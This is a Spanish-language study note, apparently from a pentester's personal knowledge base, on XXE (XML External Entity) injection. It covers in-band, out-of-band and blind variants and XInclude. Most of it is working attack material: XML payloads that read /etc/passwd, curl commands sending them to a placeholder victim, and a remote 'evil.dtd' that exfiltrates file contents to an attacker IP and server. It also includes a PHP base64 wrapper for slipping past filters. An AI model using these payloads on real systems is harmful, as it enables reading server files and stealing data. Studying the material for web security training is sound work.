-------
Tags: #xml #database #inyección #injection #explotación #Exploitation #blind  #wrappers #xxe 

-----------------
# Definición  
[[XXE - XML External Entity Injection]] es una vulnerabilidad que permite a un atacante usar entidades externas definidas en XML para acceder a archivos internos, realizar SSRF o exfiltrar datos, aprovechando parsers mal configurados.

---
# 📚 Tipos de XXE

| Tipo          | Descripción breve                                                                      | Resultado principal                       |
| ------------- | -------------------------------------------------------------------------------------- | ----------------------------------------- |
| **In-band**   | Se inyecta una entidad externa y aparece directamente en la respuesta                  | Lectura de archivos, SSRF visibles        |
| **OOB XXE**   | La entidad externa provoca una petición a tu servidor, sin respuesta directa visible   | Exfiltrado a través del DNS/HTTP          |
| **Blind OOB** | Variante de OOB donde no se recibe información inmediata; se deduce por comportamiento | Requiere DTD remota y monitoreo DNS/HTTP  |

---
## 🧪 Tipo 1: In-band XXE

> [!info] Se define una entidad que lee un archivo local y se inserta directamente en el XML.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

💥 Qué hace: Si la respuesta incluye el contenido del archivo, la inyección es exitosa.

>Parámetros: <!DOCTYPE>, <!ENTITY ... SYSTEM "file://...">, &xxe; → entidad

Script sencillo de ejemplo (curl + fichero XML):

```bash
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' > exploit.xml
curl -X POST -H "Content-Type: text/xml" --data @exploit.xml http://victima.com/xml
```

- **🌐 Tipo 2: OOB XXE**

>La entidad provoca que el parser haga una petición a tu servidor, sin mostrar datos en la respuesta inmediata.

>XML enviado:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://mi-servidor.com/evil.dtd">
  %dtd;
]>
```

>evil.dtd alojada en tu servidor:
>
```xml    
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.152:4444/?data=%file;'>">
%all;
%send;     
```

==IMPORTANTE==: Cuando hay una **subentidad** (Entidad dentro de otra) se pone el **%** en **hexadecimal** con el valor: `&#x25;` (Observar ejemplo de arriba y abajo).

> ==IMPORTANTE==: A veces es necesario crear un **wrapper** para saltar filtros en este caso con php a base64:
```xml      
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.152:4444/?data=%file;'>">
%all;
%send;
```
🔁 Cómo funciona:

1- La entidad **%file** lee /etc/passwd.

2- La entidad **%dtd** carga tu DTD remoto.

3- %all define &send; que hace una petición HTTP con los datos.

4- Tu servidor recibe /etc/passwd en la URL. 

🚨 Parámetros clave: **%file**, **%dtd**, DTD remota, http://.../?data=%file

Script sencillo:
```bash
printf '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY %% file SYSTEM "file:///etc/passwd"><!ENTITY %% dtd SYSTEM "http://mi.com/evil.dtd">%%dtd;]><data>&send;</data>' > oob.xml
curl -X POST -H "Content-Type:text/xml" --data @oob.xml http://victima.com/xml
```

- 👻 Tipo 3: Blind OOB XXE

[!info] No ves respuesta ni ves errores, pero usas una llamada externa para confirmar condiciones y extraer datos.

XML enviado (directo, sin DTD):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://mi-servidor.com/?a">
  %xxe;
]>
<foo/>
```
Sólo detectas si la llamada a mi-servidor.com ocurre. 

XML con DTD remoto para exfiltrar:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://mi.com/evil.dtd">
  %xxe;
]>
<foo/>
```

Con la misma evil.dtd anterior, capturas datos sin ver la respuesta. 
securityidiots.com

## 🛠️ Resumen de parámetros clave por tipo

|Parámetro|In-band|OOB|Blind OOB|
|---|---|---|---|
|`<!ENTITY xxe SYSTEM "...">`|✅ file://|✅ file:// + http://|✅ http://|
|`%file`, `%dtd`|❌|✅|✅|
|`&xxe;`, `&send;`|✅ aparece en respuesta|❌ no aparece|❌ no aparece|
|Lado servidor|No requerido|DTD remoto|DTD remoto|
|Recepción de datos|Directa|HTTP/DNS|HTTP/DNS|

**🧶 Otros vectores: XInclude**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
📍 Inyecta contenido de archivos sin usar entidades DTD.

---------
# Referencias

- Cheat Sheet y material de Portswigger: [Enlace](https://portswigger.net/web-security/xxe#what-is-xml-external-entity-injection)
